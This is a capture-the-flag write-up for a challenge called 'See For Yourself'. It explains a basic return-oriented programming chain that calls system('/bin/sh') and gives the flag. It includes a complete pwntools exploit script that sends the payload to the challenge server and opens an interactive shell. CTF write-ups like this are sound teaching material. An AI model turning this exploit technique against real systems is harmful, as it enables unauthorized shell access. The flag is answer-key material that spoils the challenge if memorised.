# See For Yourself

As the binary name suggests, it's very simple ROP. The binary has the /bin/sh string in it, and it has system in its plt because it calls system(NULL). So, all we need to do is pop rdi + /bin/sh address + retgadget + system@plt (retgadget for stack alignment remotely, as always.)

#### Flag: flag{ROP_ROOP_OOP_OOPS}
```py
from pwn import *
context.arch = 'amd64'
poprdi = 0x0000000000401273
binsh = 0x402008
system = 0x401080
ret = 0x40101a
e = ELF("./simplerop")
p = e.process() if args.LOCAL else remote('chal.ctf.b01lers.com', 1008)
NUM_TO_RET = 8
p.clean()
payload = b'A'*NUM_TO_RET
payload += flat(poprdi,binsh,ret,system)
pause()
p.sendline(payload)
p.interactive()
```
